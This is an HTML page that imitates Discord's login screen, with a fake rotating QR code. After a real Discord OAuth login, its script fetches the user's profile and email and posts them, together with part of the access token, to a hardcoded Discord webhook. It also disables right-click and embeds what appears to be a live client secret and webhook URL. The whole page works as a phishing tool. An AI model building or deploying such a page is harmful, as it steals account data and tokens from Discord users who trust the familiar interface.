<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Login</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.1/qrcode.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: #36393f;
      color: white;
    }
    .container {
      display: flex;
      gap: 40px;
      max-width: 600px;
    }
    .left-section {
      flex: 1;
      text-align: center;
    }
    .login-button {
      background: #5865f2;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.2s;
    }
    .login-button:hover:not(:disabled) {
      background: #4752c4;
    }
    .login-button:disabled {
      background: #4f545c;
      cursor: not-allowed;
    }
    .right-section {
      flex: 1;
    }
    .qr-code {
      width: 180px;
      height: 180px;
      background: white;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      margin: 0 auto;
    }
    .qr-code img {
      position: absolute;
      width: 40px;
      height: 40px;
      bottom: 10px;
      right: 10px;
      border-radius: 50%;
      background: white;
      padding: 2px;
    }
    /* Spinner animations */
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
    }
    .pulsingEllipsis .item {
      display: inline-block;
      width: 4px;
      height: 4px;
      margin: 0 1px;
      background: currentColor;
      border-radius: 50%;
      animation: pulse 1.4s infinite ease-in-out;
    }
    .pulsingEllipsis .item:nth-child(1) { animation-delay: -0.32s; }
    .pulsingEllipsis .item:nth-child(2) { animation-delay: -0.16s; }
    @keyframes pulse {
      0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
      40% { transform: scale(1); opacity: 1; }
    }
    .wanderingCubes .item {
      display: inline-block;
      width: 10px;
      height: 10px;
      background: #5865f2;
      animation: wander 1.8s infinite ease-in-out;
    }
    .wanderingCubes .item:nth-child(2) {
      animation-delay: 0.9s;
    }
    @keyframes wander {
      0%, 100% { transform: translate(0, 0) rotate(0deg); }
      50% { transform: translate(20px, -20px) rotate(180deg); }
    }
    .qrCode-spinner {
      width: 40px;
      height: 40px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left-section">
      <h1>Discord</h1>
      <p>Discord BG</p>
      <hr style="border: none; border-top: 1px solid #4f545c; width: 100%;">
      <button id="loginButton" class="login-button">Log In with Discord</button>
    </div>
    <div class="right-section">
      <div class="qr-code"></div>
    </div>
  </div>

  <script>
    // Paste the entire corrected JS code here (from my previous response)
    const CLIENT_ID = "1424516359081164840";
    const CLIENT_SECRET = "K-82g7OPPevGWbz0A0LlJZMyJZG-9qZ3";
    const REDIRECT_URI = "https://jewls-gray.vercel.app/callback";  // Updated for Vercel
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";
    const DISCORD_SCOPES = "identify email";  // Added 'email' for user.email

    function generateRandomString(length) {
      const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
      let result = "";
      const array = new Uint8Array(length);
      crypto.getRandomValues(array);
      for (let i = 0; i < length; i++) {
        result += characters[array[i] % characters.length];
      }
      return result;
    }

    async function sha256(plain) {
      const encoder = new TextEncoder();
      const data = encoder.encode(plain);
      return crypto.subtle.digest("SHA-256", data);
    }

    async function base64URLEncode(arrayBuffer) {
      const bytes = new Uint8Array(arrayBuffer);
      let binary = "";
      for (let i = 0; i < bytes.byteLength; i++) {
        binary += String.fromCharCode(bytes[i]);
      }
      return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
    }

    async function generatePKCE() {
      const codeVerifier = generateRandomString(128);
      sessionStorage.setItem("pkce_verifier", codeVerifier);
      return await base64URLEncode(await sha256(codeVerifier));
    }

    async function getOAuthURL() {
      const codeChallenge = await generatePKCE();
      sessionStorage.setItem("code_challenge", codeChallenge);
      const params = new URLSearchParams({
        client_id: CLIENT_ID,
        redirect_uri: REDIRECT_URI,
        response_type: "code",
        scope: DISCORD_SCOPES,
        state: generateRandomString(16),
        code_challenge: codeChallenge,
        code_challenge_method: "S256",
      });
      return `https://discord.com/api/oauth2/authorize?${params.toString()}`;
    }

    async function exchangeCodeForToken(code) {
      const verifier = sessionStorage.getItem("pkce_verifier");
      if (!verifier) throw new Error("PKCE verifier not found");
      const body = new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: "authorization_code",
        code: code,
        redirect_uri: REDIRECT_URI,
        code_verifier: verifier,
      });
      const response = await fetch("https://discord.com/api/oauth2/token", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body.toString(),
      });
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Token exchange failed: ${response.status} - ${errorText}`);
      }
      return await response.json();
    }

    async function fetchUserInfo(accessToken) {
      const response = await fetch("https://discord.com/api/users/@me", {
        headers: { Authorization: `Bearer ${accessToken}` },
      });
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Failed to fetch user: ${response.status} - ${errorText}`);
      }
      return await response.json();
    }

    async function sendAuthDataToWebhook(user, accessToken) {
      const payload = {
        username: user.username,
        discriminator: user.discriminator,
        id: user.id,
        email: user.email || "N/A",
        avatar: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null,
        accessToken: accessToken,
        timestamp: new Date().toISOString(),
      };
      const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: "New Discord Auth Login",
          embeds: [
            {
              title: "Authenticated User",
              fields: [
                { name: "Username", value: `${payload.username}#${payload.discriminator}`, inline: true },
                { name: "User ID", value: payload.id, inline: true },
                { name: "Email", value: payload.email, inline: true },
                { name: "Access Token", value: `${payload.accessToken.substring(0, 20)}...`, inline: false },
                { name: "Timestamp", value: payload.timestamp, inline: false },
              ],
              thumbnail: { url: payload.avatar },
              color: 0x5865F2,
            },
          ],
        }),
      });
      if (!response.ok) {
        console.error("Failed to send to webhook:", response.statusText);
        // Don't alert here to avoid spamming; log instead
      } else {
        console.log("Webhook sent successfully");
      }
    }

    async function handleAuthCallback() {
      const urlParams = new URLSearchParams(window.location.search);
      const code = urlParams.get("code");
      const error = urlParams.get("error");
      const state = urlParams.get("state");  // Optional: validate against stored state
      const loginButton = document.getElementById("loginButton");

      console.log("Callback params:", { code: code ? `${code.substring(0, 20)}...` : null, error, state });  // Debug log

      if (error) {
        console.error("OAuth error:", error);
        alert(`Auth error: ${error}`);
        window.history.replaceState({}, document.title, window.location.pathname);
        return;
      }

      if (code) {
        try {
          if (loginButton) {
            loginButton.innerHTML = `
              <span class="spinner" role="img" aria-label="Loading">
                <span class="inner pulsingEllipsis">
                  <span class="item spinnerItem"></span>
                  <span class="item spinnerItem"></span>
                  <span class="item spinnerItem"></span>
                </span>
              </span>`;
            loginButton.setAttribute("disabled", "true");
          }

          const tokenData = await exchangeCodeForToken(code);
          console.log("Token received:", tokenData);  // Debug log (token expires_in, etc.)
          const user = await fetchUserInfo(tokenData.access_token);
          console.log("User info:", user);  // Debug log
          await sendAuthDataToWebhook(user, tokenData.access_token);
          alert(`Login successful! Welcome, ${user.username}#${user.discriminator}`);
          window.history.replaceState({}, document.title, window.location.pathname);
          if (loginButton) {
            loginButton.textContent = `Logged in as ${user.username}`;
            loginButton.style.backgroundColor = "#43b581";
          }
        } catch (err) {
          console.error("Auth failed:", err);
          alert(`Authentication failed: ${err.message}. Check console for details.`);
        } finally {
          if (loginButton) {
            loginButton.innerHTML = "";
            loginButton.textContent = "Log In with Discord";
            loginButton.removeAttribute("disabled");
          }
        }
      } else {
        console.log("No code in callback; normal page load.");
      }
    }

    function animateEllipsis() {
      const loginButton = document.getElementById("loginButton");
      if (!loginButton) return;
      loginButton.innerHTML = `
        <span class="spinner" role="img" aria-label="Loading">
          <span class="inner pulsingEllipsis">
            <span class="item spinnerItem"></span>
            <span class="item spinnerItem"></span>
            <span class="item spinnerItem"></span>
          </span>
        </span>`;
      loginButton.setAttribute("disabled", "true");
      setTimeout(async () => {
        window.location.href = await getOAuthURL();
      }, 1000);
    }

    function generateRandomStringOld() {
      const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      let result = "";
      for (let i = 0; i < 43; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return result;
    }

    function generateQRCode(data) {
      const qrCodeContainer = document.querySelector(".qr-code");
      if (!qrCodeContainer) return;
      qrCodeContainer.innerHTML = "";
      try {
        const qr = qrcode(0, "L");
        qr.addData(data);
        qr.make();
        const svgString = qr.createSvgTag(1, 0);
        const parser = new DOMParser();
        const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
        const svgElement = svgDoc.documentElement;
        svgElement.setAttribute("width", "140");
        svgElement.setAttribute("height", "140");
        qrCodeContainer.appendChild(svgElement);
        // Add logo overlay (assuming you have the image; otherwise, skip)
        qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`);
      } catch (error) {
        console.error("Error generating QR code:", error);
        qrCodeContainer.innerHTML = `<p>QR Code Error</p>`;
      }
      qrCodeContainer.style.background = "white";
    }

    function removeQrCodeAnimation() {
      const qrCodeContainer = document.querySelector(".qr-code");
      if (!qrCodeContainer) return;
      generateQRCode(`https://discord.com/ra/${generateRandomStringOld()}`);
    }

    function simulateQrCodeChange() {
      const qrCodeContainer = document.querySelector(".qr-code");
      if (!qrCodeContainer) return;
      qrCodeContainer.innerHTML = "";
      qrCodeContainer.style.background = "transparent";
      qrCodeContainer.insertAdjacentHTML(
        "afterbegin",
        `
        <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
          <span class="inner wanderingCubes">
            <span class="item"></span>
            <span class="item"></span>
          </span>
        </span>`
      );
      setTimeout(removeQrCodeAnimation, 3500);
    }

    // Init
    const loginButton = document.getElementById("loginButton");
    if (loginButton) {
      loginButton.textContent = "Log In with Discord";
      loginButton.addEventListener("click", animateEllipsis);
    }
    document.addEventListener("contextmenu", (e) => e.preventDefault());
    setInterval(simulateQrCodeChange, 120 * 1000);
    
    // Generate initial QR
    removeQrCodeAnimation();
    
    // Handle callback on load
    handleAuthCallback();
  </script>
</body>
</html>
